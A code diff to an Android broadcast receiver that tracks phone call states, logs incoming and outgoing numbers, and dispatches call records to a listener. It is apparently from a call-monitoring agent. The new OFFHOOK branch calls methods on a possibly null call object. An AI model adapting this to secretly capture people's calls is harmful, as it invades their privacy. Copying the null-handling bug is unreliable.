@@ -55,7 +55,6 @@ public class BC extends BroadcastReceiver {
 				return;
 			}
 
-
 			String extraIntent = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
 
 			if (Cfg.DEBUG) {
@@ -70,7 +69,7 @@ public class BC extends BroadcastReceiver {
 					Check.log(TAG + " (onReceive): 1 OUTGOING, number: " + number);//$NON-NLS-1$
 				}
 
-				call = new Call(number, Call.OUTGOING, Call.START);
+				call = new Call(number, Call.OUTGOING);
 			} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
 				// il numero delle chiamate entranti lo abbiamo solo qui
 				final String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
@@ -80,50 +79,69 @@ public class BC extends BroadcastReceiver {
 					Check.log(TAG + " (onReceive): 2 RINGING, number: " + number);//$NON-NLS-1$
 				}
 
-				call = new Call(number, Call.INCOMING, Call.START);
+				call = new Call(number, Call.INCOMING);
 			} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
 				// Call disconnected
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (onReceive): 3 IDLE -> END");//$NON-NLS-1$
 				}
 
-				if (call != null) {
-					if (call.isIncoming())
-						call = new Call("", Call.INCOMING, Call.END); //$NON-NLS-1$
-					else
-						call = new Call("", Call.OUTGOING, Call.END); //$NON-NLS-1$
-
-					call.setComplete();
+				if (Cfg.DEBUG) {
+					Check.asserts(call != null, " (onReceive) Assert failed: call null");
 				}
-			} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) { 
+				if (call != null) {
+					
+					if(call.isIncoming()){
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (onReceive) RECEIVING CALL");
+						}
+						
+						call.setComplete(call.isOngoing());
+						call.setOngoing(false);
+					}else{
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (onReceive) ENDING OUTGOING CALL"); //don't know if answered..
+						}
+						call.setOngoing(false);
+						call.setComplete(true);
+					}
+				}
+			} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
 				// Qui la chiamata e' davvero in corso
 				// Call answered, or issuing new outgoing call
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (onReceive): 4 OFFHOOK");//$NON-NLS-1$
 				}
 
-				if (call == null) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (onReceive): we didn't catch the ringing"); //$NON-NLS-1$
-					}
-				} else {
-					call.setComplete();
+				if (Cfg.DEBUG) {
+					Check.asserts(call != null, " (onReceive) Assert failed: call null");
+				}
+				if (call != null) {
+					//call.setComplete(true);
 					Check.log(TAG + " (onReceive): 4 OFFHOOK, call ready");//$NON-NLS-1$
 				}
 
+				call.setOngoing(true);
+				call.setOffhook();
 				//call = new Call("", Call.OUTGOING, Call.START); //$NON-NLS-1$
 			} else {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (onReceive): default, assume END");//$NON-NLS-1$
 				}
-
-				call = new Call("", Call.OUTGOING, Call.END); //$NON-NLS-1$
-				call.setComplete();
+				if (Cfg.DEBUG) {
+					Check.asserts(call != null, " (onReceive) Assert failed: call null");
+				}
+				if (call != null) {
+					call.setOngoing(false);
+					call.setComplete(false);
+				}
+				
+				return;
 			}
 
 			// Caller/Callee number, incoming?/outgoing, in
 			// progress?/disconnected
-			if (call != null && call.isComplete() == true) {
+			if (call != null) {
 				ListenerCall.self().dispatch(call);
 			}
 		} catch (Exception ex) {
